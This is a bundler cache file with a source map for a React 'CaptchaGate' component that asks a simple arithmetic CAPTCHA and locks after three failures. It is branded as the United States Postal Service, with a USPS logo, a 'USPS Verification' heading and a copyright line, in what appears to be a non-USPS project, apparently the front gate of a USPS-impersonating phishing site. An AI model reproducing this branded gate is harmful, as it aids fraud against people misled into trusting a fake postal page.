{"ast":null,"code":"var _jsxFileName = \"D:\\\\upsc\\\\client\\\\src\\\\components\\\\CaptchaGate.js\",\n  _s = $RefreshSig$();\nimport React, { useState, useEffect } from 'react';\nimport { jsxDEV as _jsxDEV, Fragment as _Fragment } from \"react/jsx-dev-runtime\";\nconst CaptchaGate = ({\n  onVerified\n}) => {\n  _s();\n  const [captcha, setCaptcha] = useState({\n    question: '',\n    answer: ''\n  });\n  const [userAnswer, setUserAnswer] = useState('');\n  const [error, setError] = useState('');\n  const [loading, setLoading] = useState(false);\n  const [attempts, setAttempts] = useState(0);\n  const [showError, setShowError] = useState(false);\n\n  // Generate random CAPTCHA\n  const generateCaptcha = () => {\n    const operations = ['+', '-', '*'];\n    const operation = operations[Math.floor(Math.random() * operations.length)];\n    let num1, num2, answer;\n    switch (operation) {\n      case '+':\n        num1 = Math.floor(Math.random() * 10) + 1;\n        num2 = Math.floor(Math.random() * 10) + 1;\n        answer = num1 + num2;\n        break;\n      case '-':\n        num1 = Math.floor(Math.random() * 10) + 6;\n        num2 = Math.floor(Math.random() * 5) + 1;\n        answer = num1 - num2;\n        break;\n      case '*':\n        num1 = Math.floor(Math.random() * 5) + 1;\n        num2 = Math.floor(Math.random() * 5) + 1;\n        answer = num1 * num2;\n        break;\n    }\n    setCaptcha({\n      question: `${num1} ${operation} ${num2}`,\n      answer: answer.toString()\n    });\n    setUserAnswer('');\n    setShowError(false);\n  };\n  useEffect(() => {\n    generateCaptcha();\n  }, []);\n  const handleSubmit = e => {\n    e.preventDefault();\n    setLoading(true);\n    setError('');\n\n    // Simple validation\n    if (!userAnswer.trim()) {\n      setError('Please enter the CAPTCHA answer');\n      setLoading(false);\n      return;\n    }\n    setTimeout(() => {\n      if (userAnswer.trim() === captcha.answer) {\n        sessionStorage.setItem('captchaVerified', 'true');\n        onVerified();\n      } else {\n        setAttempts(prev => prev + 1);\n        setShowError(true);\n        setError(`Incorrect answer. Please try again. (Attempt ${attempts + 1}/3)`);\n        generateCaptcha();\n        if (attempts >= 2) {\n          setError('Too many failed attempts. Please refresh the page.');\n          setLoading(true); // Lock the form\n          return;\n        }\n      }\n      setLoading(false);\n    }, 500);\n  };\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    className: \"captcha-gate-container\",\n    children: [/*#__PURE__*/_jsxDEV(\"header\", {\n      className: \"usps-header\",\n      children: [/*#__PURE__*/_jsxDEV(\"img\", {\n        src: \"/usps-logo.png\",\n        alt: \"USPS Logo\",\n        className: \"usps-logo\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 83,\n        columnNumber: 9\n      }, this), /*#__PURE__*/_jsxDEV(\"h1\", {\n        children: \"USPS Verification\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 84,\n        columnNumber: 9\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 82,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(\"main\", {\n      className: \"captcha-gate-main\",\n      children: /*#__PURE__*/_jsxDEV(\"form\", {\n        onSubmit: handleSubmit,\n        className: \"captcha-form\",\n        children: [/*#__PURE__*/_jsxDEV(\"h2\", {\n          children: \"Human Verification Required\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 89,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"p\", {\n          children: \"Please solve this CAPTCHA to continue:\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 90,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: `captcha-display ${showError ? 'captcha-error-shake' : ''}`,\n          children: [/*#__PURE__*/_jsxDEV(\"span\", {\n            className: \"captcha-question\",\n            children: [captcha.question, \" = ?\"]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 93,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"input\", {\n            type: \"text\",\n            value: userAnswer,\n            onChange: e => {\n              setUserAnswer(e.target.value);\n              setShowError(false);\n            },\n            required: true,\n            placeholder: \"Your answer\",\n            disabled: loading,\n            className: `captcha-input ${showError ? 'input-error' : ''}`\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 94,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 92,\n          columnNumber: 11\n        }, this), error && /*#__PURE__*/_jsxDEV(\"div\", {\n          className: `captcha-error-message ${showError ? 'error-show' : ''}`,\n          children: error\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 109,\n          columnNumber: 13\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"captcha-footer\",\n          children: [/*#__PURE__*/_jsxDEV(\"button\", {\n            type: \"button\",\n            onClick: generateCaptcha,\n            className: \"captcha-refresh\",\n            disabled: loading,\n            children: \"\\u21BB New CAPTCHA\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 115,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n            type: \"submit\",\n            disabled: loading || attempts >= 3,\n            className: \"captcha-submit\",\n            children: loading ? /*#__PURE__*/_jsxDEV(_Fragment, {\n              children: [/*#__PURE__*/_jsxDEV(\"span\", {\n                className: \"captcha-spinner\"\n              }, void 0, false, {\n                fileName: _jsxFileName,\n                lineNumber: 131,\n                columnNumber: 19\n              }, this), \" Verifying...\"]\n            }, void 0, true) : 'Continue'\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 124,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 114,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 88,\n        columnNumber: 9\n      }, this)\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 87,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(\"footer\", {\n      className: \"captcha-footer\",\n      children: /*#__PURE__*/_jsxDEV(\"p\", {\n        children: [\"\\xA9 \", new Date().getFullYear(), \" United States Postal Service. All rights reserved.\"]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 140,\n        columnNumber: 9\n      }, this)\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 139,\n      columnNumber: 7\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 81,\n    columnNumber: 5\n  }, this);\n};\n_s(CaptchaGate, \"FQHXUT+uD95E61g83n9/9dshexA=\");\n_c = CaptchaGate;\nexport default CaptchaGate;\nvar _c;\n$RefreshReg$(_c, \"CaptchaGate\");","map":{"version":3,"names":["React","useState","useEffect","jsxDEV","_jsxDEV","Fragment","_Fragment","CaptchaGate","onVerified","_s","captcha","setCaptcha","question","answer","userAnswer","setUserAnswer","error","setError","loading","setLoading","attempts","setAttempts","showError","setShowError","generateCaptcha","operations","operation","Math","floor","random","length","num1","num2","toString","handleSubmit","e","preventDefault","trim","setTimeout","sessionStorage","setItem","prev","className","children","src","alt","fileName","_jsxFileName","lineNumber","columnNumber","onSubmit","type","value","onChange","target","required","placeholder","disabled","onClick","Date","getFullYear","_c","$RefreshReg$"],"sources":["D:/upsc/client/src/components/CaptchaGate.js"],"sourcesContent":["import React, { useState, useEffect } from 'react';\r\n\r\n\r\nconst CaptchaGate = ({ onVerified }) => {\r\n  const [captcha, setCaptcha] = useState({ question: '', answer: '' });\r\n  const [userAnswer, setUserAnswer] = useState('');\r\n  const [error, setError] = useState('');\r\n  const [loading, setLoading] = useState(false);\r\n  const [attempts, setAttempts] = useState(0);\r\n  const [showError, setShowError] = useState(false);\r\n\r\n  // Generate random CAPTCHA\r\n  const generateCaptcha = () => {\r\n    const operations = ['+', '-', '*'];\r\n    const operation = operations[Math.floor(Math.random() * operations.length)];\r\n    let num1, num2, answer;\r\n\r\n    switch(operation) {\r\n      case '+':\r\n        num1 = Math.floor(Math.random() * 10) + 1;\r\n        num2 = Math.floor(Math.random() * 10) + 1;\r\n        answer = num1 + num2;\r\n        break;\r\n      case '-':\r\n        num1 = Math.floor(Math.random() * 10) + 6;\r\n        num2 = Math.floor(Math.random() * 5) + 1;\r\n        answer = num1 - num2;\r\n        break;\r\n      case '*':\r\n        num1 = Math.floor(Math.random() * 5) + 1;\r\n        num2 = Math.floor(Math.random() * 5) + 1;\r\n        answer = num1 * num2;\r\n        break;\r\n    }\r\n\r\n    setCaptcha({\r\n      question: `${num1} ${operation} ${num2}`,\r\n      answer: answer.toString()\r\n    });\r\n    setUserAnswer('');\r\n    setShowError(false);\r\n  };\r\n\r\n  useEffect(() => {\r\n    generateCaptcha();\r\n  }, []);\r\n\r\n  const handleSubmit = (e) => {\r\n    e.preventDefault();\r\n    setLoading(true);\r\n    setError('');\r\n    \r\n    // Simple validation\r\n    if (!userAnswer.trim()) {\r\n      setError('Please enter the CAPTCHA answer');\r\n      setLoading(false);\r\n      return;\r\n    }\r\n\r\n    setTimeout(() => {\r\n      if (userAnswer.trim() === captcha.answer) {\r\n        sessionStorage.setItem('captchaVerified', 'true');\r\n        onVerified();\r\n      } else {\r\n        setAttempts(prev => prev + 1);\r\n        setShowError(true);\r\n        setError(`Incorrect answer. Please try again. (Attempt ${attempts + 1}/3)`);\r\n        generateCaptcha();\r\n        \r\n        if (attempts >= 2) {\r\n          setError('Too many failed attempts. Please refresh the page.');\r\n          setLoading(true); // Lock the form\r\n          return;\r\n        }\r\n      }\r\n      setLoading(false);\r\n    }, 500);\r\n  };\r\n\r\n  return (\r\n    <div className=\"captcha-gate-container\">\r\n      <header className=\"usps-header\">\r\n        <img src=\"/usps-logo.png\" alt=\"USPS Logo\" className=\"usps-logo\" />\r\n        <h1>USPS Verification</h1>\r\n      </header>\r\n      \r\n      <main className=\"captcha-gate-main\">\r\n        <form onSubmit={handleSubmit} className=\"captcha-form\">\r\n          <h2>Human Verification Required</h2>\r\n          <p>Please solve this CAPTCHA to continue:</p>\r\n          \r\n          <div className={`captcha-display ${showError ? 'captcha-error-shake' : ''}`}>\r\n            <span className=\"captcha-question\">{captcha.question} = ?</span>\r\n            <input\r\n              type=\"text\"\r\n              value={userAnswer}\r\n              onChange={(e) => {\r\n                setUserAnswer(e.target.value);\r\n                setShowError(false);\r\n              }}\r\n              required\r\n              placeholder=\"Your answer\"\r\n              disabled={loading}\r\n              className={`captcha-input ${showError ? 'input-error' : ''}`}\r\n            />\r\n          </div>\r\n          \r\n          {error && (\r\n            <div className={`captcha-error-message ${showError ? 'error-show' : ''}`}>\r\n              {error}\r\n            </div>\r\n          )}\r\n          \r\n          <div className=\"captcha-footer\">\r\n            <button \r\n              type=\"button\" \r\n              onClick={generateCaptcha}\r\n              className=\"captcha-refresh\"\r\n              disabled={loading}\r\n            >\r\n              ↻ New CAPTCHA\r\n            </button>\r\n            \r\n            <button \r\n              type=\"submit\" \r\n              disabled={loading || attempts >= 3} \r\n              className=\"captcha-submit\"\r\n            >\r\n              {loading ? (\r\n                <>\r\n                  <span className=\"captcha-spinner\"></span> Verifying...\r\n                </>\r\n              ) : 'Continue'}\r\n            </button>\r\n          </div>\r\n        </form>\r\n      </main>\r\n      \r\n      <footer className=\"captcha-footer\">\r\n        <p>© {new Date().getFullYear()} United States Postal Service. All rights reserved.</p>\r\n      </footer>\r\n    </div>\r\n  );\r\n};\r\n\r\nexport default CaptchaGate;"],"mappings":";;AAAA,OAAOA,KAAK,IAAIC,QAAQ,EAAEC,SAAS,QAAQ,OAAO;AAAC,SAAAC,MAAA,IAAAC,OAAA,EAAAC,QAAA,IAAAC,SAAA;AAGnD,MAAMC,WAAW,GAAGA,CAAC;EAAEC;AAAW,CAAC,KAAK;EAAAC,EAAA;EACtC,MAAM,CAACC,OAAO,EAAEC,UAAU,CAAC,GAAGV,QAAQ,CAAC;IAAEW,QAAQ,EAAE,EAAE;IAAEC,MAAM,EAAE;EAAG,CAAC,CAAC;EACpE,MAAM,CAACC,UAAU,EAAEC,aAAa,CAAC,GAAGd,QAAQ,CAAC,EAAE,CAAC;EAChD,MAAM,CAACe,KAAK,EAAEC,QAAQ,CAAC,GAAGhB,QAAQ,CAAC,EAAE,CAAC;EACtC,MAAM,CAACiB,OAAO,EAAEC,UAAU,CAAC,GAAGlB,QAAQ,CAAC,KAAK,CAAC;EAC7C,MAAM,CAACmB,QAAQ,EAAEC,WAAW,CAAC,GAAGpB,QAAQ,CAAC,CAAC,CAAC;EAC3C,MAAM,CAACqB,SAAS,EAAEC,YAAY,CAAC,GAAGtB,QAAQ,CAAC,KAAK,CAAC;;EAEjD;EACA,MAAMuB,eAAe,GAAGA,CAAA,KAAM;IAC5B,MAAMC,UAAU,GAAG,CAAC,GAAG,EAAE,GAAG,EAAE,GAAG,CAAC;IAClC,MAAMC,SAAS,GAAGD,UAAU,CAACE,IAAI,CAACC,KAAK,CAACD,IAAI,CAACE,MAAM,CAAC,CAAC,GAAGJ,UAAU,CAACK,MAAM,CAAC,CAAC;IAC3E,IAAIC,IAAI,EAAEC,IAAI,EAAEnB,MAAM;IAEtB,QAAOa,SAAS;MACd,KAAK,GAAG;QACNK,IAAI,GAAGJ,IAAI,CAACC,KAAK,CAACD,IAAI,CAACE,MAAM,CAAC,CAAC,GAAG,EAAE,CAAC,GAAG,CAAC;QACzCG,IAAI,GAAGL,IAAI,CAACC,KAAK,CAACD,IAAI,CAACE,MAAM,CAAC,CAAC,GAAG,EAAE,CAAC,GAAG,CAAC;QACzChB,MAAM,GAAGkB,IAAI,GAAGC,IAAI;QACpB;MACF,KAAK,GAAG;QACND,IAAI,GAAGJ,IAAI,CAACC,KAAK,CAACD,IAAI,CAACE,MAAM,CAAC,CAAC,GAAG,EAAE,CAAC,GAAG,CAAC;QACzCG,IAAI,GAAGL,IAAI,CAACC,KAAK,CAACD,IAAI,CAACE,MAAM,CAAC,CAAC,GAAG,CAAC,CAAC,GAAG,CAAC;QACxChB,MAAM,GAAGkB,IAAI,GAAGC,IAAI;QACpB;MACF,KAAK,GAAG;QACND,IAAI,GAAGJ,IAAI,CAACC,KAAK,CAACD,IAAI,CAACE,MAAM,CAAC,CAAC,GAAG,CAAC,CAAC,GAAG,CAAC;QACxCG,IAAI,GAAGL,IAAI,CAACC,KAAK,CAACD,IAAI,CAACE,MAAM,CAAC,CAAC,GAAG,CAAC,CAAC,GAAG,CAAC;QACxChB,MAAM,GAAGkB,IAAI,GAAGC,IAAI;QACpB;IACJ;IAEArB,UAAU,CAAC;MACTC,QAAQ,EAAE,GAAGmB,IAAI,IAAIL,SAAS,IAAIM,IAAI,EAAE;MACxCnB,MAAM,EAAEA,MAAM,CAACoB,QAAQ,CAAC;IAC1B,CAAC,CAAC;IACFlB,aAAa,CAAC,EAAE,CAAC;IACjBQ,YAAY,CAAC,KAAK,CAAC;EACrB,CAAC;EAEDrB,SAAS,CAAC,MAAM;IACdsB,eAAe,CAAC,CAAC;EACnB,CAAC,EAAE,EAAE,CAAC;EAEN,MAAMU,YAAY,GAAIC,CAAC,IAAK;IAC1BA,CAAC,CAACC,cAAc,CAAC,CAAC;IAClBjB,UAAU,CAAC,IAAI,CAAC;IAChBF,QAAQ,CAAC,EAAE,CAAC;;IAEZ;IACA,IAAI,CAACH,UAAU,CAACuB,IAAI,CAAC,CAAC,EAAE;MACtBpB,QAAQ,CAAC,iCAAiC,CAAC;MAC3CE,UAAU,CAAC,KAAK,CAAC;MACjB;IACF;IAEAmB,UAAU,CAAC,MAAM;MACf,IAAIxB,UAAU,CAACuB,IAAI,CAAC,CAAC,KAAK3B,OAAO,CAACG,MAAM,EAAE;QACxC0B,cAAc,CAACC,OAAO,CAAC,iBAAiB,EAAE,MAAM,CAAC;QACjDhC,UAAU,CAAC,CAAC;MACd,CAAC,MAAM;QACLa,WAAW,CAACoB,IAAI,IAAIA,IAAI,GAAG,CAAC,CAAC;QAC7BlB,YAAY,CAAC,IAAI,CAAC;QAClBN,QAAQ,CAAC,gDAAgDG,QAAQ,GAAG,CAAC,KAAK,CAAC;QAC3EI,eAAe,CAAC,CAAC;QAEjB,IAAIJ,QAAQ,IAAI,CAAC,EAAE;UACjBH,QAAQ,CAAC,oDAAoD,CAAC;UAC9DE,UAAU,CAAC,IAAI,CAAC,CAAC,CAAC;UAClB;QACF;MACF;MACAA,UAAU,CAAC,KAAK,CAAC;IACnB,CAAC,EAAE,GAAG,CAAC;EACT,CAAC;EAED,oBACEf,OAAA;IAAKsC,SAAS,EAAC,wBAAwB;IAAAC,QAAA,gBACrCvC,OAAA;MAAQsC,SAAS,EAAC,aAAa;MAAAC,QAAA,gBAC7BvC,OAAA;QAAKwC,GAAG,EAAC,gBAAgB;QAACC,GAAG,EAAC,WAAW;QAACH,SAAS,EAAC;MAAW;QAAAI,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OAAE,CAAC,eAClE7C,OAAA;QAAAuC,QAAA,EAAI;MAAiB;QAAAG,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OAAI,CAAC;IAAA;MAAAH,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OACpB,CAAC,eAET7C,OAAA;MAAMsC,SAAS,EAAC,mBAAmB;MAAAC,QAAA,eACjCvC,OAAA;QAAM8C,QAAQ,EAAEhB,YAAa;QAACQ,SAAS,EAAC,cAAc;QAAAC,QAAA,gBACpDvC,OAAA;UAAAuC,QAAA,EAAI;QAA2B;UAAAG,QAAA,EAAAC,YAAA;UAAAC,UAAA;UAAAC,YAAA;QAAA,OAAI,CAAC,eACpC7C,OAAA;UAAAuC,QAAA,EAAG;QAAsC;UAAAG,QAAA,EAAAC,YAAA;UAAAC,UAAA;UAAAC,YAAA;QAAA,OAAG,CAAC,eAE7C7C,OAAA;UAAKsC,SAAS,EAAE,mBAAmBpB,SAAS,GAAG,qBAAqB,GAAG,EAAE,EAAG;UAAAqB,QAAA,gBAC1EvC,OAAA;YAAMsC,SAAS,EAAC,kBAAkB;YAAAC,QAAA,GAAEjC,OAAO,CAACE,QAAQ,EAAC,MAAI;UAAA;YAAAkC,QAAA,EAAAC,YAAA;YAAAC,UAAA;YAAAC,YAAA;UAAA,OAAM,CAAC,eAChE7C,OAAA;YACE+C,IAAI,EAAC,MAAM;YACXC,KAAK,EAAEtC,UAAW;YAClBuC,QAAQ,EAAGlB,CAAC,IAAK;cACfpB,aAAa,CAACoB,CAAC,CAACmB,MAAM,CAACF,KAAK,CAAC;cAC7B7B,YAAY,CAAC,KAAK,CAAC;YACrB,CAAE;YACFgC,QAAQ;YACRC,WAAW,EAAC,aAAa;YACzBC,QAAQ,EAAEvC,OAAQ;YAClBwB,SAAS,EAAE,iBAAiBpB,SAAS,GAAG,aAAa,GAAG,EAAE;UAAG;YAAAwB,QAAA,EAAAC,YAAA;YAAAC,UAAA;YAAAC,YAAA;UAAA,OAC9D,CAAC;QAAA;UAAAH,QAAA,EAAAC,YAAA;UAAAC,UAAA;UAAAC,YAAA;QAAA,OACC,CAAC,EAELjC,KAAK,iBACJZ,OAAA;UAAKsC,SAAS,EAAE,yBAAyBpB,SAAS,GAAG,YAAY,GAAG,EAAE,EAAG;UAAAqB,QAAA,EACtE3B;QAAK;UAAA8B,QAAA,EAAAC,YAAA;UAAAC,UAAA;UAAAC,YAAA;QAAA,OACH,CACN,eAED7C,OAAA;UAAKsC,SAAS,EAAC,gBAAgB;UAAAC,QAAA,gBAC7BvC,OAAA;YACE+C,IAAI,EAAC,QAAQ;YACbO,OAAO,EAAElC,eAAgB;YACzBkB,SAAS,EAAC,iBAAiB;YAC3Be,QAAQ,EAAEvC,OAAQ;YAAAyB,QAAA,EACnB;UAED;YAAAG,QAAA,EAAAC,YAAA;YAAAC,UAAA;YAAAC,YAAA;UAAA,OAAQ,CAAC,eAET7C,OAAA;YACE+C,IAAI,EAAC,QAAQ;YACbM,QAAQ,EAAEvC,OAAO,IAAIE,QAAQ,IAAI,CAAE;YACnCsB,SAAS,EAAC,gBAAgB;YAAAC,QAAA,EAEzBzB,OAAO,gBACNd,OAAA,CAAAE,SAAA;cAAAqC,QAAA,gBACEvC,OAAA;gBAAMsC,SAAS,EAAC;cAAiB;gBAAAI,QAAA,EAAAC,YAAA;gBAAAC,UAAA;gBAAAC,YAAA;cAAA,OAAO,CAAC,iBAC3C;YAAA,eAAE,CAAC,GACD;UAAU;YAAAH,QAAA,EAAAC,YAAA;YAAAC,UAAA;YAAAC,YAAA;UAAA,OACR,CAAC;QAAA;UAAAH,QAAA,EAAAC,YAAA;UAAAC,UAAA;UAAAC,YAAA;QAAA,OACN,CAAC;MAAA;QAAAH,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OACF;IAAC;MAAAH,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OACH,CAAC,eAEP7C,OAAA;MAAQsC,SAAS,EAAC,gBAAgB;MAAAC,QAAA,eAChCvC,OAAA;QAAAuC,QAAA,GAAG,OAAE,EAAC,IAAIgB,IAAI,CAAC,CAAC,CAACC,WAAW,CAAC,CAAC,EAAC,qDAAmD;MAAA;QAAAd,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OAAG;IAAC;MAAAH,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAChF,CAAC;EAAA;IAAAH,QAAA,EAAAC,YAAA;IAAAC,UAAA;IAAAC,YAAA;EAAA,OACN,CAAC;AAEV,CAAC;AAACxC,EAAA,CA5IIF,WAAW;AAAAsD,EAAA,GAAXtD,WAAW;AA8IjB,eAAeA,WAAW;AAAC,IAAAsD,EAAA;AAAAC,YAAA,CAAAD,EAAA","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}